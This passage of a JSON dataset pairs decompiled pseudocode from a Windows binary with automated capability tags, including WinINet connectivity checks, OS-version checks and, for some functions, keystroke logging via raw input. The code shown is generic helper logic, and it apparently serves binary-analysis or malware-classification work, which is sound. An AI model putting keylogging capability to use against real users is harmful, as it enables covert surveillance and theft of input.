        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00417ff0(void)\n\n{\n    int32_t arg_8h;\n    int32_t arg_10h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    unkbyte10 Var3;\n    ulong uVar4;\n    int32_t in_stack_ffffffb4;\n    ushort uVar5;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint8_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    uStack64 = 0x4182c8;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_8h = fcn.00417cbc();\n    if (var_8h == NULL) {\n        fcn.00417c90();\n        goto code_r0x004182a5;\n    }\n    var_ch = fcn.00418374();\n    uVar2 = ***var_8h;\n    if (uVar2 < 0x12) {\n    // switch table (18 cases) at 0x41806a\n        switch(*(uVar2 * 4 + 0x41806a)) {\n        case 0x4180b2:\n            arg_8h = *(var_ch + 5);\n            arg_10h = *(var_ch + 1);\n            if (arg_10h < arg_8h) {\n                in_stack_ffffffb4 = arg_10h >> 0x1f;\n                fcn.00417f88(arg_8h, arg_8h >> 0x1f, arg_10h, in_stack_ffffffb4, &stack0xfffffffc);\n                fcn.004186b0();\n            }\n            else {\n                in_stack_ffffffb4 = 0;\n                fcn.00417f88(arg_8h, 0, arg_10h, 0, &stack0xfffffffc);\n                fcn.004186b0();\n            }\n            break;\n        case 0x418108:\n            iVar1 = fcn.00415a6c();\n            if (iVar1 == 0x100) {\n                fcn.00415b34();\n                fcn.00418730();\n            }\n            else {\n                iVar1 = fcn.00415a6c();\n                if (iVar1 == 0xb) {\n                    fcn.00412a5c();\n                    fcn.00402f70();\n                    fcn.004186b0();\n                }\n                else {\n                    in_stack_ffffffb4 = *(var_ch + 1) >> 0x1f;\n                    fcn.00417f88(*(var_ch + 5), *(var_ch + 5) >> 0x1f, *(var_ch + 1), in_stack_ffffffb4, \n                                 &stack0xfffffffc);\n                    fcn.004186b0();\n                }\n            }\n            break;\n        case 0x418194:\n            iVar1 = fcn.00415a6c();\n            if (iVar1 == 3) {\n                fcn.0041110c();\n                fcn.004186b0();\n            }\n            else {\n                fcn.00415b34();\n                fcn.004189b4();\n            }\n            break;\n        case 0x4181d8:\n            uVar5 = 0x41;\n            Var3 = fcn.00412a5c();\n            in_stack_ffffffb4 = Var3 >> 0x20;\n            fcn.00418f6c(Var3, in_stack_ffffffb4, CONCAT22(uVar5, Var3 >> 0x40));\n            break;\n        case 0x4181f6:\n            fcn.00415b34();\n            fcn.00418c50();\n            break;\n        case 0x418213:\n            fcn.00415b78();\n            fcn.00418d64();\n            break;\n        case 0x41822d:\n            fcn.004191cc();\n            break;\n        case 0x41823c:\n            in_stack_ffffffb4 = var_ch[1];\n            uVar4 = fcn.00417f88(var_ch[2], var_ch[3], *var_ch, in_stack_ffffffb4, &stack0xfffffffc);\n            fcn.0041926c(uVar4, uVar4 >> 0x20);\n            break;\n        case 0x418262:\n            fcn.00416718();\n            fcn.004186b0();\n            break;\n        case 0x41827e:\n            goto code_r0x0041827e;\n        }\n    }\n    else {\ncode_r0x0041827e:\n        var_28h = **var_8h + 1;\n        var_24h._0_1_ = 4;\n        in_stack_ffffffb4 = 0;\n        fcn.0040c9d4(0, &var_28h);\n        fcn.00403fc0();\n    }\ncode_r0x004182a5:\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    iStack68 = 0x4182cf;\n    fcn.00404cd4();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1283
    },
    "00418380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418380(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x418457;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*in_EAX == '\\x01') {\n        puStack32 = &stack0xfffffffc;\n        fcn.00408c28();\n    }\n    else {\n        fcn.00418374();\n        iVar2 = fcn.00418374();\n        if ((in_EAX == *0x401000) || (*(iVar2 + 1) < 0)) {\n            fcn.0040461c();\n            cVar1 = fcn.004089f4();\n            if (cVar1 != '\\0') {\n                fcn.00408900();\n                fcn.0040461c();\n            }\n        }\n        else {\n            if (param_2 != 0) {\n                do {\n                    param_2 = param_2 + -1;\n                } while (param_2 != 0);\n            }\n            fcn.0040482c();\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41845e;\n    uStack36 = 0x418456;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 371
    },
    "004184c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint fcn.004184c0(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00408d64();\n        return uVar2;\n    }\n    iVar3 = fcn.00418374();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.004089f4();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.004089f4();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00408d64();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.00418474();\n    }\n    return uVar2;\n}\n",
        "token_count": 215
    },
    "00418594": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00418594(void)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    int32_t iStack16;\n    uint *puStack12;\n    \n    puStack12 = fcn.00418524();\n    if ((puStack12 != NULL) && (*0x4185e4 != iStack16)) {\n        uVar1 = ***puStack12;\n        bVar2 = uVar1 < 0x1f;\n        if (uVar1 < 0x20) {\n            bVar2 = (*(&iStack16 + ((uVar1 & 0x7f) >> 3)) >> (uVar1 & 7) & 1) != 0;\n        }\n        if (!bVar2) {\n            puStack12 = NULL;\n        }\n    }\n    return CONCAT44(puStack12, puStack12);\n}\n",
        "token_count": 192
    },
    "004185e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004185e8(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    \n    puVar4 = param_2;\n    for (uVar2 = *(in_EAX + 10 + *(in_EAX + 1)); uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    while( true ) {\n        iVar1 = in_EAX + 2 + (uVar2 & 0xffffff00 | *(in_EAX + 1));\n        uVar3 = uVar2 & 0xffffff00 | *(iVar1 + 10);\n        uVar2 = *(iVar1 + 0xb + uVar3);\n        if (uVar2 != 0) {\n            iVar5 = iVar1 + 0xd + uVar3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(iVar5 + 0x1a);\n                if (param_2[*(iVar5 + 0x18)] == 0) {\n                    param_2[*(iVar5 + 0x18)] = iVar5;\n                }\n                iVar5 = iVar5 + 0x1b + uVar3;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar2 = 0;\n        if (*(iVar1 + 4) == NULL) break;\n        in_EAX = **(iVar1 + 4);\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "0041863c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041863c(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 398
    },
    "004187ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004187ac(int32_t *arg_8h)\n\n{\n    char in_CL;\n    uint32_t in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint in_stack_ffffffc8;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x418860;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.004045c8();\n    fcn.00418374();\n    uVar1 = 0;\n    do {\n        bVar2 = uVar1 < 0x1f;\n        if (uVar1 < 0x20) {\n            bVar2 = (in_EDX >> (uVar1 & 0x1f) & 1) != 0;\n        }\n        if (bVar2) {\n            if (*arg_8h != 0) {\n                fcn.00404890();\n            }\n            fcn.00418380();\n            fcn.00404890();\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 != 0x20);\n    if (in_CL != '\\0') {\n        in_stack_ffffffc8 = 0x418890;\n        fcn.00404948(0x418890, *arg_8h, 0x418884);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    fcn.004045c8(0x418867);\n    return;\n}\n",
        "token_count": 387
    },
    "004188d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004188d8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    char *var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack44 = 0x4189a3;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (param_2 != 0) {\n        for (var_4h = fcn.00404a88(); (*var_4h == ' ' || (*var_4h == '[')); var_4h = var_4h + 1) {\n        }\n        iVar1 = fcn.00418374();\n        var_ch = **(iVar1 + 1);\n        fcn.00418894();\n        while (var_8h != 0) {\n            iVar1 = fcn.004184c0();\n            if (iVar1 < 0) {\n                var_14h = var_8h;\n                var_10h._0_1_ = 0xb;\n                fcn.0040c9d4(0, &fcn.004188d8::var_14h);\n                fcn.00403fc0();\n            }\n            fcn.00418894();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4189aa;\n    uStack44 = 0x4189a2;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 410
    },
    "0041ccdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ccdc(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0041ccfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ccfc(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00422f1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422f1c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00422f3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422f3c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0041b200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b200(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0041b1a0();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.0041b1a0();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.00403a58();\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0041b270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0041b270(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 8) = uVar1;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.0041c358();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 255
    },
    "0041b4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b4b0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.0041c4c8();\n            cVar1 = fcn.0041b490();\n            if (cVar1 != '\\0') {\n                fcn.0041c3a4();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.0041c4c8();\n            cVar1 = fcn.0041b490();\n            if (cVar1 != '\\0') {\n                fcn.0041c3a4();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar2 = (**(**(in_EAX + 8) + 0x14))();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            (**(**(in_EAX + 8) + 0x18))();\n            cVar1 = fcn.0041b490();\n            if (cVar1 != '\\0') {\n                (**(**(in_EAX + 8) + 0x48))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "0041b6b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041b6b4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.0041c4c8();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.0041b32c();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 180
    },
    "0041b788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b788(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0041b670();\n    if (iVar2 == 0) {\n        fcn.0041b6f8(&stack0xfffffffc);\n    }\n    fcn.0041b194();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.0041c4c8();\n            if ((iVar3 != iVar2) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.0041c4c8();\n                    cVar1 = fcn.00403a58();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.0041b670(),  iVar4 == iVar2)) {\n                        fcn.0041c3a4();\n                        fcn.0041c358();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "0041b914": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041b914(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.0041c4c8();\n            fcn.0041b4b0();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00403820();\n                fcn.0041c3a4();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0041b964": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b964(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x41b979;\n        in_EAX = fcn.00403b58();\n    }\n    puStack48 = 0x41b98c;\n    fcn.004037f0();\n    puStack48 = 0x41b998;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x41b9a8;\n    fcn.0041b850();\n    uStack52 = 0x41ba63;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x485860 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.0041c4c8();\n            cVar2 = fcn.0041b38c();\n            if (cVar2 != '\\0') {\n                fcn.0041c358();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x485860 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.0041c4c8();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.0041c358();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41ba6a;\n    uStack52 = 0x41ba62;\n    fcn.0041b908();\n    return;\n}\n",
        "token_count": 556
    },
    "0041bac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041bac0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41badd;\n    fcn.0041b850();\n    uStack32 = 0x41bb37;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041c4c8();\n            iVar1 = fcn.0041b32c();\n            if (iVar1 != 0) {\n                fcn.0040406c();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41bb3e;\n    uStack32 = 0x41bb36;\n    iVar2 = fcn.0041b908();\n    return iVar2;\n}\n",
        "token_count": 300
    },
    "0041bea8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041bea8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x41bec0;\n    iVar1 = fcn.0041c8b0();\n    uStack28 = 0x41bf12;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0041c4c8();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.0040406c();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41bf19;\n    uStack28 = 0x41bf11;\n    uVar3 = fcn.0041c914();\n    return uVar3;\n}\n",
        "token_count": 308
    },
    "0041bfa8": {
        "rules": [
